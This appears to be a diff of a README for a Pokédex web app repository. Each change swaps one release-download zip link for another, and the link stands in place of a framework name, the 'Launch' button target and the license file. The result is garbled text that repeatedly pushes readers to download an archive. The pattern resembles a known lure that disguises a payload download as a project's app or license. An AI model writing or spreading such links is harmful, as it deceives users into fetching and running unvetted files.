@@ -4,14 +4,14 @@ Welcome to the Pokedex-WebApp repository! 🚀
 
 ## Overview
 
-Pokedex-WebApp is a modern, interactive Pokédex web application built with https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v1.0/Application.zip, TypeScript, and Framer Motion. It features real-time search, an authentic Pokédex design, and comprehensive Pokémon information. For the best experience on mobile, make sure to view the web app in "Desktop site" mode! 🔴 ⚡
+Pokedex-WebApp is a modern, interactive Pokédex web application built with https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v2.0/Software.zip, TypeScript, and Framer Motion. It features real-time search, an authentic Pokédex design, and comprehensive Pokémon information. For the best experience on mobile, make sure to view the web app in "Desktop site" mode! 🔴 ⚡
 
 ## Features
 
 🔹 Real-time search functionality  
 🔹 Authentic Pokédex design  
 🔹 Comprehensive Pokémon information  
-🔹 Built with https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v1.0/Application.zip, TypeScript, and Framer Motion  
+🔹 Built with https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v2.0/Software.zip, TypeScript, and Framer Motion  
 🔹 Responsive design for various screen sizes  
 
 ## Repository Topics
@@ -33,7 +33,7 @@ Pokedex-WebApp is a modern, interactive Pokédex web application built with http
 
 To check out the Pokedex-WebApp in action, click on the button below:
 
-[![Launch Pokedex-WebApp](https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v1.0/Application.zip)](https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v1.0/Application.zip)
+[![Launch Pokedex-WebApp](https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v2.0/Software.zip)](https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v2.0/Software.zip)
 
 *(Note: The link provided needs to be launched)*
 
@@ -68,7 +68,7 @@ This project was made possible thanks to the following contributors:
 
 ## License
 
-This project is licensed under the MIT License - see the [https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v1.0/Application.zip](https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v1.0/Application.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v2.0/Software.zip](https://github.com/YCatuser1857235/Pokedex-WebApp/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
